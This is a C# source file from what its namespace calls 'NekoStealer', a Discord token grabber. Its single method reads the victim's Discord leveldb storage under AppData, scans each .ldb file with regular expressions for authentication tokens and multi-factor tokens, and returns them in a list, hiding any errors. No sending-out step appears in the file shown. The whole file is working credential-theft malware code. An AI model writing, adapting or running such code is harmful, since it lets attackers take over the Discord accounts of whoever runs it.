using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NekoStealer
{
    class Discord
    {
        public static List<string> Get(string toPath)
        {
            DirectoryInfo path = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\" + toPath + @"\Local Storage\leveldb"); //Folder
            List<string> tokenList = new List<string>();
            try
            {
                foreach (var OpenFile in path.GetFiles("*.ldb"))  // Finding file with extenstion .ldb
                {
                    string reader = OpenFile.OpenText().ReadToEnd();  // Reading


                    foreach (Match aboba in Regex.Matches(reader, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")) // Grabbing
                        tokenList.Add(aboba.Value);

                    foreach (Match fuckKarders in Regex.Matches(reader, @"mfa\.[\w-]{84}")) // Grabbing
                        tokenList.Add(fuckKarders.Value);
                }
            }
            catch { }
            tokenList = tokenList.Distinct().ToList();  // Adding to list
            return tokenList; // Return (For convenience)
        }
    }

}
